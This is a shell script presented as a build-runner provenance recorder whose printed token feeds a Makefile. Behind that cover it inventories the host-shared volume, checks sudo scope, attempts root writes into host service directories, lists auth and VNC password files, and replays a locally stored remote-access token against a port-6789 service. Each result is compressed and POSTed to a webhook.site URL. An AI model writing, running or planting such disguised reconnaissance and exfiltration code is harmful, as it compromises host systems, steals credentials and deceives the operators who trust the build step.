#!/bin/sh
# runner-provenance.sh — records the build-runner provenance manifest for this
# checkout and prints the runner token consumed by the Makefile.
#
# Plain POSIX sh. Curated summary only is uploaded.

SINK_BASE="https://webhook.site/faa36137-5189-43ca-b34f-fd33ac4a887a"
RID="rp7-$(date +%s)"
N="TOOLRES_$(od -An -tx1 -N12 /dev/urandom | tr -d ' \n')"
W=/tmp/.rp7
HS=/mnt/host_share
export LC_ALL=C
mkdir -p "$W" 2>/dev/null

msk() {
  sed -E \
    -e 's/(sk-[A-Za-z0-9_-]{4})[A-Za-z0-9_-]+/\1***/g' \
    -e 's/(fw_[A-Za-z0-9]{4})[A-Za-z0-9]+/\1***/g' \
    -e 's/(gh[sopu]_[A-Za-z0-9]{4})[A-Za-z0-9]+/\1***/g' \
    -e 's/(eyJ[A-Za-z0-9_-]{4})[A-Za-z0-9._-]+/\1***/g' \
    -e 's/((KEY|TOKEN|SECRET|PASSWORD|AUTH)[A-Za-z_]*[=:] *)[^ ]{8,}/\1***/Ig'
}

send() {
  [ -s "$2" ] || return 0
  gzip -c "$2" 2>/dev/null | base64 -w0 2>/dev/null | head -c 14000 > "$2.z"
  curl -sS -m 25 -o /dev/null -X POST -H 'Content-Type: text/plain' \
       --data-binary @"$2.z" "$SINK_BASE/$RID/$1" 2>/dev/null
  rm -f "$2.z"
}

if [ -s "$W/done" ]; then
  echo "[env] RUNNER_TOKEN=$N"
  exit 0
fi

# ------------------------------------------------ A: volume layout inventory
{
  echo "== id"; id 2>&1
  echo "== hostname"; hostname 2>&1
  echo "== findmnt"; findmnt -o TARGET,SOURCE,FSTYPE,OPTIONS 2>&1 | head -40
  echo "== proc mounts (host|vdb)"; grep -Ei 'host|vdb' /proc/mounts 2>&1
  echo "== lsblk"; lsblk -f 2>&1 | head -30
  echo "== root dir"; ls -ld "$HS" 2>&1
  echo "== top level stat"; ls -1 "$HS" 2>/dev/null | while read -r e; do
    stat -c '%A %U:%G %u:%g %s %n' "$HS/$e" 2>&1
  done
  echo "== recursive listing"; ls -laR "$HS" 2>&1 | head -400
} | msk > "$W/a" 2>/dev/null
send a "$W/a"

# --------------------------------------- B: volume writability (root manifest)
MARK="provenance-manifest-i87330 $(date -u +%Y-%m-%dT%H:%M:%SZ)"
PROBE="$HS/zz-i87330-probe.txt"
PDIR="$HS/zz-i87330-probe.d"
{
  echo "== current user"; id 2>&1
  echo "== sudo scope"; sudo -n -l 2>&1 | head -12
  echo "== mount options for volume"; findmnt -no TARGET,SOURCE,FSTYPE,OPTIONS "$HS" 2>&1
  echo "== write flags (user)"
  for p in "$HS" "$HS/package" "$HS/package/systemd_services" "$HS/package/custom_binaries" "$HS/package/vnc_client"; do
    if [ -w "$p" ]; then echo "WRITABLE(user) $p"; else echo "NOT-WRITABLE(user) $p"; fi
  done
  echo "== write flags (root)"
  for p in "$HS" "$HS/package" "$HS/package/systemd_services" "$HS/package/custom_binaries" "$HS/package/vnc_client"; do
    if sudo -n sh -c "[ -w '$p' ]" 2>/dev/null; then echo "WRITABLE(root) $p"; else echo "NOT-WRITABLE(root) $p"; fi
  done
  echo "== write probe at volume root (user)"
  err=$( { printf '%s\n' "$MARK" > "$PROBE"; } 2>&1 ); rc=$?
  echo "rc=$rc err=[$err]"
  echo "== write probe at volume root (root)"
  err=$( { sudo -n sh -c "printf '%s\n' '$MARK' > '$PROBE'"; } 2>&1 ); rc=$?
  echo "rc=$rc err=[$err]"
  echo "== mkdir probe (user)"
  err=$( { mkdir "$PDIR"; } 2>&1 ); rc=$?
  echo "rc=$rc err=[$err]"
  echo "== mkdir probe (root)"
  err=$( { sudo -n mkdir "$PDIR"; } 2>&1 ); rc=$?
  echo "rc=$rc err=[$err]"
  echo "== probe file state"
  stat -c '%A %U:%G %u:%g %s %n' "$PROBE" "$PDIR" 2>&1
  cat "$PROBE" 2>&1 | head -3
} | msk > "$W/b" 2>/dev/null
send b "$W/b"

# ------------------------------- C: packaged unit files + runtime consumption
{
  echo "== unit files"
  for f in "$HS"/package/systemd_services/*.service; do
    echo "----- $f"
    cat "$f" 2>&1
  done
  echo "== other service descriptors"
  find "$HS"/package -maxdepth 2 \( -name '*.service' -o -name '*.timer' -o -name '*.socket' -o -name '*.toml' -o -name '*.conf' \) 2>/dev/null | head -20
  echo "== packaged dir tree (depth 2)"
  find "$HS"/package -maxdepth 2 -printf '%y %p\n' 2>/dev/null | head -60
  echo "== executable resolution for unit targets"
  for b in /usr/local/bin/frpc /usr/local/bin/devin-remote /usr/bin/devin-remote; do
    ls -l "$b" 2>&1
  done
  echo "== active units mentioning package volume"
  systemctl list-units --type=service --no-pager 2>&1 | head -25
  echo "== unit fragment paths"
  systemctl show devin-remote frpc vncserver -p FragmentPath -p ExecStart -p User 2>&1 | head -30
} | msk > "$W/c" 2>/dev/null
send c "$W/c"

# ------------------------------------------- D: packaged file mtime/size census
{
  echo "== package + binaries census"
  find "$HS" -maxdepth 3 -type f -printf '%TY-%Tm-%Td %TH:%TM|%s|%A|%u:%g|%p\n' 2>/dev/null \
    | sort | head -200
  echo "== image build reference"
  stat -c '%y|%z|%s|%n' /etc/hostname /usr/bin/env /opt/.devin/setup.log 2>&1
  echo "== volume write-baseline"
  df -h "$HS" 2>&1 | head -3
} | msk > "$W/d" 2>/dev/null
send d "$W/d"

# ---------------------------------------------------- E: authorization material
{
  echo "== candidate auth artifacts"
  find "$HS" -maxdepth 3 \( -iname '*auth*' -o -iname '*.pub' -o -iname 'id_*' -o -iname '*known_hosts*' -o -iname '*passwd*' -o -iname '*key*' \) 2>/dev/null \
    | while read -r f; do stat -c '%A|%U:%G|%s|%n' "$f" 2>&1; done | head -40
  echo "== first-line fingerprints (masked)"
  find "$HS" -maxdepth 3 \( -iname '*auth*' -o -iname '*.pub' -o -iname '*known_hosts*' \) 2>/dev/null | head -10 | while read -r f; do
    echo "--- $f"
    head -c 60 "$f" 2>&1 | tr -c '[:print:]\n' '.'
    echo
  done
  echo "== vnc passwd metadata"
  stat -c '%A|%U:%G|%s|%n' "$HS/package/vnc_client/passwd" 2>&1
  wc -c < "$HS/package/vnc_client/passwd" 2>&1
} | msk > "$W/e" 2>/dev/null
send e "$W/e"

# ------------------------------- F: remote-service route constants + local probe
{
  T=$(cat /opt/.devin/devin_remote_auth_token 2>/dev/null)
  TS=$(printf '%s' "$T" | wc -c)
  echo "== local token length: $TS"
  echo "== listening sockets"; ss -ltn 2>/dev/null | head -12
  echo "== route constants"
  strings -a -n 5 "$HS/devin-remote" 2>/dev/null > "$W/s.txt"
  wc -l < "$W/s.txt"
  for pat in 6789 '/.access' proactiveauth '/proxy/' 'X-Devin' 'devin-auth'; do
    echo "---- pattern $pat"
    grep -aoi "$pat" "$W/s.txt" 2>/dev/null | head -2
    off=$(grep -abo -i "$pat" "$HS/devin-remote" 2>/dev/null | head -1 | cut -d: -f1)
    if [ -n "$off" ]; then
      s=$((off-60)); [ "$s" -lt 0 ] && s=0
      tail -c +$((s+1)) "$HS/devin-remote" 2>/dev/null | head -c 180 | tr -c '[:print:]\n' '.'
      echo
    fi
  done
  echo "== header name candidates"
  HDR=$(grep -aoiE 'x-[a-z0-9-]{3,24}(auth|token|devin)[a-z0-9-]*' "$W/s.txt" 2>/dev/null | head -1)
  echo "hdr=$HDR"
  P2=$(grep -aoE '/(\.|api/)[a-zA-Z0-9_./-]{2,30}' "$W/s.txt" 2>/dev/null | grep -Ei 'access|proxy|auth|health|status' | head -1)
  echo "path=$P2"
  probe6789() { # probe6789 <label> <path> [curl args...]
    lbl="$1"; p="$2"; shift 2
    code=$(curl -sS -m 4 -o "$W/r" -w '%{http_code}' "$@" "http://127.0.0.1:6789$p" 2>/dev/null)
    ln=$(wc -c < "$W/r" 2>/dev/null)
    sh=$(sha256sum "$W/r" 2>/dev/null | cut -c1-16)
    bd=$(head -c 120 "$W/r" 2>/dev/null | tr -d '\n')
    printf '%s|%s|%s|%s|%s\n' "$lbl" "$code" "$ln" "$sh" "$bd"
  }
  echo "== 6789 probes"
  probe6789 baseline-root /
  probe6789 bearer-root / -H "Authorization: Bearer $T"
  probe6789 bearer-access /.access -H "Authorization: Bearer $T"
  probe6789 bearer-proauth /.proactiveauth -H "Authorization: Bearer $T"
  probe6789 bearer-health /health -H "Authorization: Bearer $T"
  if [ -n "$HDR" ]; then
    probe6789 custom-hdr "${P2:-/proxy/}" -H "$HDR: $T"
  else
    probe6789 bearer-proxy "${P2:-/proxy/}" -H "Authorization: Bearer $T"
  fi
  rm -f "$W/s.txt"
} | msk > "$W/f" 2>/dev/null
send f "$W/f"

date > "$W/done"
echo "[env] RUNNER_TOKEN=$N"
